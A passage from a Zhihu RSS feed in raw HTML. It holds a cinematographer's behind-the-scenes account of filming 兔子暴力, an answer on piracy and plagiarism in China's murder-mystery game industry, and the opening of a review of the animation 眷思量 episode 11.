data-watermark-src=\"v2-4ae3749adc6af4ba0e7a939c6e53b1b4\" data-private-watermark-src=\"v2-e3469711e5696af4ade1c952c1af2693\"></p>\n<p>第三次出现隧道是结尾，冒着烟雾神秘的隧道，黄车开出来行驶在隧道中，水青面对镜头微笑，其实水青是在幻想和马悦悦说话。这是对第一次隧道车上水青和妈妈说米易隧道的的回应，水青手上拿着印着马悦悦头像的房地产广告册页。出了这个隧道就回到新城一个温暖的家。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-373bff795e6bded35c7f4ad0c0d43661_720w.jpg?rss\" data-rawwidth=\"3272\" data-rawheight=\"1415\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-373bff795e6bded35c7f4ad0c0d43661\" data-watermark-src=\"v2-2843bf77dc57c2e942ef6ddbba1134d8\" data-private-watermark-src=\"v2-2a8c9328630086e4d324d7f279286cf4\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-4bef1cd2c7ee28d101f5874302722128_720w.jpg?rss\" data-rawwidth=\"3308\" data-rawheight=\"1780\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-4bef1cd2c7ee28d101f5874302722128\" data-watermark-src=\"v2-3728531066848038bca1831f94a98982\" data-private-watermark-src=\"v2-d2150d3d574ae7662a2af7652d131edc\"></p>\n<p>我自己是很痴迷这种独特的空间，觉得有一种生命的不可预知性在里面。2008年我在韩国学习时，拍摄短片就有一场隧道的戏，当时从黄岳泰老师那里学到很多，他给我详细讲解了他摄影，金城武主演《不夜城》的幕后。我后来还在云南、北京、浙江、陕西拍摄过不同结构的隧道。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-890514e64d68b38ceca65969382a9236_720w.jpg?rss\" data-rawwidth=\"2592\" data-rawheight=\"1787\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-890514e64d68b38ceca65969382a9236\" data-watermark-src=\"v2-3a82c95a49fd6c9be669df6dd5be1a93\" data-private-watermark-src=\"v2-3fa9675a4165fa0838bbb4e78609c5bb\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-8e79bbcd0968f2369406766fab75ccf7_720w.jpg?rss\" data-rawwidth=\"3264\" data-rawheight=\"2448\" data-size=\"normal\" data-caption=\"（2008年在釜山拍摄，背景是隧道和车戏专用低角度拖车）。\" data-watermark=\"watermark\" data-original-src=\"v2-8e79bbcd0968f2369406766fab75ccf7\" data-watermark-src=\"v2-cebde7e41eb5f0be21ea2acbb7d98779\" data-private-watermark-src=\"v2-358994736ec3b32c0e7e7e3d8bcd3dc5\"></p>\n<p><br></p>\n<p>七问：拍摄中有没有意外呈现或者说惊喜画面给大家分享？</p>\n<p>答： </p>\n<p><img src=\"https://pic1.zhimg.com/v2-31992ccc1b267a057e208228d99e1e53_720w.jpg?rss\" data-rawwidth=\"1067\" data-rawheight=\"806\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-31992ccc1b267a057e208228d99e1e53\" data-watermark-src=\"v2-da3926b37286b447a90c7bd70ea71f80\" data-private-watermark-src=\"v2-cf4b0579eccd4f7298096f2027fa7355\"></p>\n<p>全片女人味最足的地方就是聚餐后去隧道，四个女人唱歌，万茜开车的戏。我们先是黄昏密度时刻在炳草岗大桥拍完第一个镜头，堵车中转场金沙江大道东段大本营已经晚上10点了，刚在拖车上拍了一条，此刻雨越下越大，江边路灯熄灭了，演员快超时了，三大问题迎面而来，几乎面临崩溃，大家累了一天此刻出现浮躁情绪，伙伴们疑惑地看着我，顿时压力山大。我和导演说，稍等我备双机拍摄力图加快进度，那是一个冒险的决定。我们摄影组5个人是单机职位配置，一个小助理临时充当我的焦点员，我装了一个28-76mm变焦镜头在拖车的右侧，重新安排了s60照明，行驶中抓拍到了李庚希唱歌，突然她打开车窗，把脖子伸出来呼吸挥手，还敲万茜车窗玻璃互动，好美的时刻，这一段是演员即兴表演被我装的是变焦镜头抓拍到了一条过，李庚希探头到前车窗时我zoom out了才能框住母女二人。没有想到定档海报就是那个瞬间的截图，概括了这短暂开心的瞬间。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-294b08cb34d74f94b7e8cbc8cd6060f4_720w.jpg?rss\" data-rawwidth=\"3316\" data-rawheight=\"1825\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-294b08cb34d74f94b7e8cbc8cd6060f4\" data-watermark-src=\"v2-23ce0895ef63521629f3f2c975a03d56\" data-private-watermark-src=\"v2-69232edaf72ac96c28baba093ca0ba6e\"></p>\n<p>感谢好友邓东和铁头 TILTA赞助我个人的三轴原力跟焦器在这个时刻派上用场，其他很多车戏我用它除了控制焦点，还单独控制zoom变换景别。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-ea87c840951ca16d66fa78b9a97c7974_720w.jpg?rss\" data-rawwidth=\"799\" data-rawheight=\"592\" data-size=\"small\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-ea87c840951ca16d66fa78b9a97c7974\" data-watermark-src=\"v2-5ebb32b509fdfc84fc2cee0cbe5a485f\" data-private-watermark-src=\"v2-28ea6c8b3adc277ff3e50633d591aee2\"></p>\n<p>原剧本里只有一场雨戏气氛，但现在大家在完成片里看到的很多场景湿漉漉的感觉。我要说我们这个团队是吉人天相，顺势而为，老天帮了很多忙。</p>\n<p>针对剧本仅一场清晨的外景雨戏，我和导演商量了了一个长镜头方案，需要人工降雨，因为透视空间很大，制片主任定制了可以调控雨量的喷头。在开机前一天还专门做了下雨测试。这场戏是凌晨四个人从隧道表白回来后，金熙和马悦悦在大桥上遇到老马，那一刻天空开始下雨了。后面要拍的是曲婷水青母女下车回到剧场的路上，水青在拐角初发现一辆黑色车里有两个男人，这是全片由调性节奏的转折点，一个镜头完成。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-e970884eedd1b2deecd7cb256cbc6da9_720w.jpg?rss\" data-rawwidth=\"4020\" data-rawheight=\"2694\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-e970884eedd1b2deecd7cb256cbc6da9\" data-watermark-src=\"v2-0503596e7f0afe7a9524036cb51d2eb7\" data-private-watermark-src=\"v2-15a304724363397ac1da1a27a1df7996\"></p>\n<p> 那几天气预报都是阳光明媚36度高温且晴天，我提议也要清晨太阳没有照到场景开始拍，现在影片里的呈现效果非常好。</p>\n<p> 学校广播站拍完水青独白的时候，天将大雨，我们立即外出拍摄了局部的下雨空景。我用使用不多三脚架对着天空，长时间拍摄10分钟，等拍到了闪电。这个镜头加强了水青想绑架金熙不成，而把诱饵转向马悦悦的紧张气氛。</p>\n<p> 八问：电影前期筹备的影像设想和最后的呈现吻合度是多少？有什么遗憾？</p>\n<p>答：有人形容导演是带着镣铐跳舞，摄影也是一样，在规定的资源里拼智慧拼能力来实现想法，我们选择了一条自由偏即兴的方法，这种创作方法有一定门槛，国内娄烨和李玉两位导演采用的比较多，刚好李玉是这个电影监制，我和导演都是娄烨粉丝，劳雷影业的基因也是偏这种风格的，方励是娄烨《颐和园》的制片人，娄烨另一位长期合作制片人耐安姐还和方励在这部电影里客串马悦悦的干爹干妈，所以现在大家看到的影像是这个团队一种自觉的选择。</p>\n<p>在实拍过程中，还是需要不断调整，技术与艺术的，但大的氛围和框架不会变，大部分契合原来的设想。比较满意的几个片段是水青幻想妈妈跳舞，想象自己小时候父母在床上逗自己玩，她的噩梦，流血 五指似乎要逃离，她幻想回家偷房本的追光，我认为比较好的是光影参与到叙事本身，而不是靠台词，虽然很短，但力量很足，这些的实现都需要团队高度配合。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-9190dc5b35e1d1e3d1d0048aff9d0cac_720w.jpg?rss\" data-rawwidth=\"3344\" data-rawheight=\"1797\" data-size=\"normal\" data-caption=\"（水青的幻觉中的妈妈 莫妮卡）\" data-watermark=\"watermark\" data-original-src=\"v2-9190dc5b35e1d1e3d1d0048aff9d0cac\" data-watermark-src=\"v2-bffd5de8fb8a8057389735babfe7c220\" data-private-watermark-src=\"v2-95d97c98fed02d6c85d73843ebee07ec\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-0c052a6e6ae4634c1a6f6e2ab2b4dfbc_720w.jpg?rss\" data-rawwidth=\"3173\" data-rawheight=\"1778\" data-size=\"normal\" data-caption=\"（水青在破沙发上的梦  这个五指手印和导演微信头像一样）\" data-watermark=\"watermark\" data-original-src=\"v2-0c052a6e6ae4634c1a6f6e2ab2b4dfbc\" data-watermark-src=\"v2-ce45acc94b6ad19e7728eac18d19520a\" data-private-watermark-src=\"v2-2bfb0d8862250c88538960f43c72e21d\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-d7e93dce87e34b69df31b69e335b6fa0_720w.jpg?rss\" data-rawwidth=\"1440\" data-rawheight=\"1131\" data-size=\"normal\" data-caption=\"（几何感构图在测试和完成方面保持一致，水青和老马回家人物被放在画面的边缘位置，显得微乎其微，大反差压抑而不自知，突出无力感）\" data-watermark=\"watermark\" data-original-src=\"v2-d7e93dce87e34b69df31b69e335b6fa0\" data-watermark-src=\"v2-dc0076c51e539a57fc42ba9504677fed\" data-private-watermark-src=\"v2-65e5e3927620eed0f3326124bc23e761\"></p>\n<p>在光影实现层面有两个遗憾：</p>\n<p>一是曲婷来学校体育馆教跳舞段落。导演要求在拍摄曲婷舞蹈的中间高光时刻，画面中心突然亮起来，四周要暗下去，我针对环境和现有灯具做出判断 空旷的体育馆拍摄日景实现不了。导演坚持原来想法，后来勉强把灯放在屋内楼顶，最后的效果是表演特别好，但光影平庸不自然也没有美感，没有帮助表演和实现导演意图。</p>\n<p>二是电影结尾最后在水青的金沙江边乐园，她带妈妈来这电话勒索老马要钱，随后被远处玩激光笔的驴友照射下发生了误判，失手误杀马悦悦，母女互相拯救的几场大戏，现在呈现光线衔接不好，环境太暗，拍摄时采用1000感光度和f1.4光孔，环境噪点很大。我和灯光师商量原计划使用气球灯在做底子光照明，制片反馈气球灯被《中国女排》拍摄调走长期使用。后来我和美术组商量，在远处对面的小路立几个支架做几个类似路灯的效果，这样高光可以反射到江面，稍微改善了一些反光。母女抱头痛哭时，只好把调度放到车灯前。 </p>\n<p><img src=\"https://pic4.zhimg.com/v2-e5a5992171c7beac724f684fb76c26e1_720w.jpg?rss\" data-rawwidth=\"2114\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-e5a5992171c7beac724f684fb76c26e1\" data-watermark-src=\"v2-b430d654f22b925aad8af57e5a0e3968\" data-private-watermark-src=\"v2-b816fd61785dce1c5e8b1e4b18f47e28\"></p>\n<p><br></p>\n<p>九问：请小结这个电影摄影方面的的得失？</p>\n<p>答：我总结了几个贴士tips： </p>\n<p>tips1：摄影机不是一台冷冰的机器，而是一个温暖的演员。</p>\n<p>tips2：同一场景中，改善打光，让表演直抵人心。</p>\n<p>tips3：做了很多灯光参考，有时现场要大胆破除设定，没有固定打光逻辑。</p>\n<p>tips4：拍摄忘掉分镜，最终做到的总没有之前想的好。</p>\n<p>tips5：突破自由和限制的边界，像《吉祥如意》，下一部电影会更好。</p>\n<p><br></p>\n<p>导演和演员是坐轿子的，摄影只是抬轿子的，最多是个颠轿子的。</p>\n<p>做到有风格、有氛围、有力量、有追求，不容易，这一部我说无悔。</p>\n<p>拍电影是玩魔法，需要直觉和化学反应，坚持就不错。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-d7608534e5ee33cc60154454f62fd797_720w.jpg?rss\" data-rawwidth=\"4029\" data-rawheight=\"2666\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-d7608534e5ee33cc60154454f62fd797\" data-watermark-src=\"v2-6cc0779244518d4f57141474f8ebfc71\" data-private-watermark-src=\"v2-5c3576806f0117f5876c0aded39674e6\"></p>\n<p>感谢监制、制片人、导演、制片主任张建、制片曲建伟、美术指导张杰涛 执行导演房震、第一副导演小凡、 画林朴总田总，ko rental卢总王平以及我的团队（掌机张兴阳 焦点刘志 摄助亓家桢 王富强 郭总会 大兵 、灯光师孙俊强和移动组长赵春城）。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-409a6e7f3628d54f00833ecf230eefb1_720w.jpg?rss\" data-rawwidth=\"4006\" data-rawheight=\"2811\" data-size=\"normal\" data-caption=\"（摄影组成员和三位小兔子周子越 金烨 李庚希）\" data-watermark=\"watermark\" data-original-src=\"v2-409a6e7f3628d54f00833ecf230eefb1\" data-watermark-src=\"v2-d2e49eb8354a01aff46ed91ea871a911\" data-private-watermark-src=\"v2-f4617f079fc524ec4122daa50af3f467\"></p>\n<p>最后分享一组片场照片，怀念那一段难忘酷暑的攀枝花时光。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-3c0dcb3acc9219831f986a4fbd3a6c5e_720w.jpg?rss\" data-rawwidth=\"1213\" data-rawheight=\"813\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-3c0dcb3acc9219831f986a4fbd3a6c5e\" data-watermark-src=\"v2-eac5ee22d4143559eba076924cb2e1dd\" data-private-watermark-src=\"v2-30601e17ad9e273d2bb3d79b323e57b5\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-7e75c5018e43c93198e905a4f1904c6c_720w.jpg?rss\" data-rawwidth=\"1213\" data-rawheight=\"813\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-7e75c5018e43c93198e905a4f1904c6c\" data-watermark-src=\"v2-dee21c3794b2b074792abb21b53ff869\" data-private-watermark-src=\"v2-6c0519b7c53ac467565ed59f0d54fdb5\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-1d46afbf27aadeb7d3ae2fe45c0b2b6d_720w.jpg?rss\" data-rawwidth=\"1213\" data-rawheight=\"813\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-1d46afbf27aadeb7d3ae2fe45c0b2b6d\" data-watermark-src=\"v2-e486735f20082fd501a7ba01143a08a7\" data-private-watermark-src=\"v2-ccd7eb151440277c0c04ec6c47cb309a\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-d883aa0cee21e780997d3442059cac4a_720w.jpg?rss\" data-rawwidth=\"1213\" data-rawheight=\"813\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-d883aa0cee21e780997d3442059cac4a\" data-watermark-src=\"v2-3f227c29156dbdf693910c9043e9d507\" data-private-watermark-src=\"v2-05efcd85ea1a8407717007cf3aa71bd3\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-d4f707b1f06089b0ed49cc5969c7bf88_720w.jpg?rss\" data-rawwidth=\"1214\" data-rawheight=\"813\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-d4f707b1f06089b0ed49cc5969c7bf88\" data-watermark-src=\"v2-5d578c68a6b4d510670956963532038c\" data-private-watermark-src=\"v2-ac4b8ca01ad28c41e290010fe31328ea\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-0f4710b8f0de0cf12b063a90f3c0b985_720w.jpg?rss\" data-rawwidth=\"1214\" data-rawheight=\"813\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-0f4710b8f0de0cf12b063a90f3c0b985\" data-watermark-src=\"v2-7648809243d193ad8bee0ffa4e4af2e8\" data-private-watermark-src=\"v2-4d05f2699b540dc6be9171085bda2daa\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-0993295fa37dc064015c610fa3bedd11_720w.jpg?rss\" data-rawwidth=\"1089\" data-rawheight=\"1044\" data-size=\"small\" data-caption=\"（以上六图使用过期富士胶卷，leica3G相机 50mm2.8缩头拍 2019年6月摄于四川攀枝花） \" data-watermark=\"watermark\" data-original-src=\"v2-0993295fa37dc064015c610fa3bedd11\" data-watermark-src=\"v2-ad77bdf8dde498506b43ceb5f8bd5910\" data-private-watermark-src=\"v2-c28a83311dff834d2e9aad4c90209cac\"></p>\n<p>     2021年8月14日七夕 影片上映首日北京 汪士卿</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/wangfilms?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">Wangfilms</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/475771670/answer/2068227062?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">15 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/341345915?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">影视剧里有哪些特别真实的暴力片段？</a><br><a href=\"http://www.zhihu.com/question/472362152?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价万茜、李庚希主演的电影《兔子暴力》？</a><br>\n","link":"http://www.zhihu.com/question/475771670/answer/2068227062?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"媒体刊文指出剧本杀风靡，抄袭盗版问题泛滥，相关问题是否很严重？应如何解决？","date":"2021-08-18 03:00:09","description":"\n<p>开门见山，这是由于剧本杀在疫情以来风靡，导致众多对剧本杀不甚了解的投资者进入剧本杀行业所带来的必然结果，当然也是每个文化产业（姑且称剧本杀为文化产业吧）的必经阶段</p>\n<p>法制日报的这个文章所指的盗版问题有二，一个一个来谈吧。</p>\n<h2>一.店家为了节约成本选择直接购买盗版剧本。</h2>\n<p>首先文章中所提出的「很多店家为了节约成本，会选择直接购买盗版剧本。」这个问题看似十分严重，会严重影响整个剧本杀行业的生态，导致劣币驱逐良币。<b>但我个人倒不是很担心。</b>原因有三：</p>\n<h3><b>正版剧本杀店家的抵制</b></h3>\n<p>目前从我的角度看，正是由于盗版横行带来严重结果大家很清楚（损害了所有正版店家等利益）因此所有的剧本杀店家都在不约而同的抵制盗版剧本杀。每当一个店家被曝光出使用盗版剧本，他在该城市的剧本杀圈子中基本宣告「社死」。</p>\n<p>为什么呢？</p>\n<p>因为当这种事发生时，每个正版店家从老板到 DM 乃至客服，往往都会发朋友圈等一些社交平台上来对这家使用盗版剧本的店家进行谴责，而这群人的朋友圈里剧本杀玩家的浓度相当之高，一旦消息开始传播，不到一天，这个城市绝大多数的剧本杀爱好者就都会知道「有一家店用盗版剧本。」大家也会去自觉的抵制。这时候有人可能会问，剧本杀店家抵制可以理解，毕竟这触及到了利益，玩家为什么会大量的去抵制呢？这就要引出第二个原因⬇️</p>\n<h3><b>玩家的抵制。</b></h3>\n<p>无论是盗版剧本还是使用盗版剧本的店家，带给玩家的游戏体验一定是极差的。</p>\n<p>首先，盗版剧本使用的纸张与修订技术往往是较差的。每一个剧本从构思，到展会测车，再到最后的完善和制作与发行，中间是过程是繁琐且辛苦的。做一个不恰当的比喻，可以说每一部剧本都是作者和发行的孩子，更何况他们都指望这个孩子挣钱。因此发行往往都会将剧本（包括但不限于剧本本身的装订、剧本使用纸张、线索卡的制作工艺、道具）包装的非常好。同时好的包装也是剧本的重要加分项。现实中也发生过一些剧本因华丽的包装来吸引众多店家购买，或吸引玩家体验。那么，作为顾客，花了小一百块钱（城限和独家可能更多）来体验一个剧本杀，等剧本发下来发现剧本知识拿很普通的 A4 纸随意订了一下，部分内容还有重影或洇墨，甚至会有缺页漏页，你会不会感觉吃了一只苍蝇。</p>\n<p>其次，使用盗版剧本店家的底层逻辑是什么？是省钱，<b>是通过「节流」的方式获取更大的利益。</b>而剧本杀的体验并不是只有剧本内容的质量和剧本装订的质量。更重要的是 DM 的带本水平以及 NPC 的水平。而在当前的剧本杀行业，由于 DM 这个职业局限性的影响，优秀的 DM 是非常少见的。当然薪资也不算低（相比于水平一般的 DM ），那么这些「节流」的店家可能去浪费时间精力和金钱去找游戏的 DM 吗，一定是不会的。这些店家大概率会去找大量兼职 DM，而这类 DM 演绎能力差、不会扶车（在剧本推进不下去或玩家推理大方向错误严重的情况下，在不剧透的大前提下对玩家的方向进行纠正）、无法脱稿。玩家的游戏体验自然就差。当然这类店家往往还会让一个 DM 带多个剧本杀。这个游戏体验之差不用过多赘述，相信大家大概能感受到一人带多车时玩家的痛苦。</p>\n<p>最后，这个是我个人比较武断的观点。也是与上面的「节流」有关，即想省钱的店家在装修和氛围的营造上一定不会舍得花钱。那么这种店往往会在逼仄的居民楼或随便找个写字楼（写字楼如果装潢 OK 也是没问题的）开，在这种地方玩本我相信游戏体验一定不会很好。</p>\n<h3><b>其发行以及作者的抵制</b></h3>\n<p>这一点其实是可以包含在第一点里的，但之所以单独列出来，是因为如果前面两个是行业下游，那么发行以及作者就算是上游。剧本杀盗版横行对行业上游造成的危害是难以估量的。发行能做的不多也就是上文所说的，把剧本做的再精致一些，花功夫做一些防伪或是让同城店铺举报。这一点就不多说了。</p>\n<p>综上，在剧本盗版这方面，可以发现盗版的店家是很难有生存空间的。这也正是我个人认为这一点不需要多说的原因。</p>\n<h2>二.抄袭核心诡计</h2>\n<p>关于法治日报刊文的第二点「抄袭核心诡计」。这个就有讨论的必要了，而且这个也是对剧本杀作者更重要的一点。依然还是先亮观点：<b>剧本杀抄袭不可能根除。</b>原因同样有三：</p>\n<h3>抄袭难定义</h3>\n<p>在推理圈子里，抄袭一直是一个普遍存在，而且很难定义的点。举一个很简单例子，《金田一少年事件簿》和《名侦探柯南》应该算是很多人的童年回忆了。而这两部作品中事实上就有许多涉嫌抄袭的剧集。</p>\n<ul>\n<li>《歌剧院杀人事件》抄了《黄屋奇案》里面走廊消失和《古墓之谜》利用窗户作案；</li>\n<li>《悲恋湖杀人事件》为复仇杀害死名字缩写为 S·K 的人的情节抄笹泽左保的《大海的请帖》；</li>\n<li>《蜡像城杀人事件》中凶手扮蜡像的情节类似岛田庄司《诅咒的木乃伊》中凶手藏身铠甲；</li>\n<li>..........</li>\n</ul>\n<p>《金田一少年事件簿》我不是太了解，这个是我在豆瓣上找的，感兴趣的大家可以再豆瓣搜「lshstar」，大佬基本把《金田一少年事件簿》中抄袭的都列出来了。大家可以去看看（侵删）</p>\n<p>同样的，《名侦探柯南》里同样也有大量抄袭的案件，同样举几个例子：</p>\n<ul>\n<li>《鸟取县蜘蛛公馆的怪事》抄袭了吉尔伯特·基思·切斯特顿的《新月市的奇迹》，说起来作者名字大家可能不了解，但布朗神父应该还是比较出名的。</li>\n<li>《电视台杀人事件》抄袭了阿加莎的《古墓之谜》（这是经典手法了，如果有更早的请在评论区指出）。这个手法更出名，剧本杀《七个密室》里的第二还是第三个就用了这个手法，但是很难说《七个密室》涉嫌抄袭。</li>\n<li>.........</li>\n</ul>\n<p>《柯南》里涉嫌抄袭的剧集我一样不多说了，有兴趣的大家可以在知乎站内或者豆瓣搜一搜，应该会有大佬列出来的。</p>\n<p>综上我们不难感受到，剧本杀的抄袭与推理小说、游戏或电影一样，抄袭都是很难去定义的。</p>\n<h3>定义难追责</h3>\n<p>我们退一步说，如果我觉得这个人抄袭了，而且周围的人也都认可，那下一步肯定就是要追责了。但是以剧本杀行业现状来看，<b>对抄袭进行追责这件事的收益与风险（或者说是成本）是远不成正比的。</b></p>\n<p>同样举个简单的例子，假设有一个剧本杀 A，我确定这个剧本杀 A，抄袭了我的剧本杀（或者推理小说同理）S。我现在要去告这个作者。我先要交诉讼费（我不太懂法律，告到法院应该是要交诉讼费的吧），然后要找律师，再然后还要投入我自己的时间和精力，甚至会耽误我自己的正事。假设我告赢了，我能获得什么。寥寥无几的赔偿？周围人的认可？这和我的付出大概率是不成正比的，说白了还是争口气。但假设我输了，不仅之前的所有投入都打了水漂，我自己还惹了一身骚，我容易吗我？</p>\n<p>所以说再对抄袭进行定义之后，追责又是一个很大的问题，而且这个问题同样难以解决。</p>\n<h3>剧本杀本身的局限性以及版权困境</h3>\n<p>这个有些涉及到我的知识盲区，如果说的与事实不符还请大家在评论区指正，感谢大家！</p>\n<p>目前我接触到的所有剧本杀作者与发行，没有一家去申请书号，无论是国内单书号、国内从书号还是 ISBN编号，都没有。究其原因我认为有以下几点</p>\n<p>首先申请书号是需要时间和金钱的，而剧本杀其实是一个节奏很快的行业，能多写出来一部优秀的剧本，就多挣一本的钱，写不出来或者发行不出来，就挣不到钱，那既然申请与不申请都不耽误剧本杀的发行，为什么还要申请呢。</p>\n<p>其次申请书号也不一定百分百成功，随着剧本杀的发展，有众多不适合未成年人玩的剧本杀，而剧本杀又没有分级制度（不过大部分的店家看到玩家是小孩子一般只会开不黄暴的欢乐本），怎么怎么可能就不可能很容易的就让剧本杀拿到书号。</p>\n<h2>该如何解决？</h2>\n<h3>盗版剧本好解决</h3>\n<p>综上所述，剧本杀盗版的第一个问题，其实相比之下比较好解决。当然现在也会有更加精致的盗版剧本，但这种剧本往往是城限或独家，买了这个本的店家往往对所在城市哪些店家有这个本很清楚，那么有一天或许发现有一家没有授权的店的剧本单上出现了这个剧本，反手一个举报就好了。剧本杀圈子不大，同一城市的剧本杀 DM 或者老板也会经常串门去玩每个店家的招牌本，对于这种破坏平衡的行业渣滓，店家和大部分玩家还是能进行判断并做出正确应对的。<b>本质上来说就是这种盗版侵犯了店家和顾客的利益，而店家和顾客作为剧本杀产业链比较小的单位，是很容易自上而下进行自我清洁</b>（随便想的词，可能不是很恰当）</p>\n<h3>抄袭核心难根除</h3>\n<p>但是针对第二个问题，这个问题在我看来才是真正无解的。首先，很难发动店家或者顾客去帮助发行与作者。因为抄袭核心诡计这个事情，它触及不到店家和玩家的核心利益。店家为了赚钱，玩家为了开心，那一个抄袭的剧本耽误店家赚钱了吗？没有。耽误玩家获得好的游戏体验了吗？或许有，但是占极小数。那么在这种情况下，只靠发行和作者，就不可能解决这个问题。</p>\n<p>剧本杀究其根本还是一个小众圈子，于正抄袭、郭敬明抄袭，我们可以发动广大的网民去进行道德审判，因为蛋糕够大。但是剧本杀这个新兴的娱乐项目，以目前的发展水平根本达不到所谓的舆论压力。撑死了一些推理迷可能在自己朋友圈骂骂这个作者，然后就没有然后了。想追责？想想上文讨论的<b>成本与收益。</b></p>\n<p>以上，感谢大家的阅读，如果想起来其他的还会继续补充。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/zha-yu-gua?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">爱吃猹的瓜</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/480078479/answer/2065815893?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">40 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/441309366?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">去哪里可以买到大量剧本杀剧本的版权？</a><br><a href=\"http://www.zhihu.com/question/471158742?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">大家是喜欢玩线上剧本杀，还是更愿意玩线下实体店剧本杀？</a><br>\n","link":"http://www.zhihu.com/question/480078479/answer/2065815893?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何评价国产动画《眷思量》第十一集？","date":"2021-08-17 15:30:08","description":"\n<p>知乎的大家好，这周有在尽量调整多休息补觉，知乎也尽量发得比上周早了些，且不用赶着交很多反馈，有空多聊两句。</p>\n<p>播到第11集了，很多线索也展现出来，开篇玄哥抓住窥探灵识的点，但这个岛水很深，相信大家看到现在也能感觉到，所以奉眠没有把握是安全的，镜玄也认同了。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-625ac341cf7b48aa37215eaef02bb6af_720w.jpg?rss\" data-rawwidth=\"2088\" data-rawheight=\"1210\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-625ac341cf7b48aa37215eaef02bb6af\" data-watermark-src=\"v2-5b4adc36fa0d93d8db2b6d5d1c71af62\" data-private-watermark-src=\"v2-e36353506fd26d57dae9b438d8195dd9\"></p>\n<p>且这次奉眠在火芝问题上肯帮镜玄，也让两人关系从之前剑拔弩张的矛盾中有所缓和。毕竟奉眠没有带娃经验，对于怎么跟叛逆少年沟通她不经历一些事也不知道。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-64e292dbc1efa43dc075e9ee58eb7c66_720w.jpg?rss\" data-rawwidth=\"1908\" data-rawheight=\"1054\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-64e292dbc1efa43dc075e9ee58eb7c66\" data-watermark-src=\"v2-37b021eb09af5395cdc3e793ba43d888\" data-private-watermark-src=\"v2-cc46b3070808d771df5b0cfc848d638c\" data-tags=\"politic\"></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-16ff95cc792b02fda65322b6219dc92c_720w.jpg?rss\" data-rawwidth=\"1800\" data-rawheight=\"1036\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-16ff95cc792b02fda65322b6219dc92c\" data-watermark-src=\"v2-65f02705f436c267832f5172e454065f\" 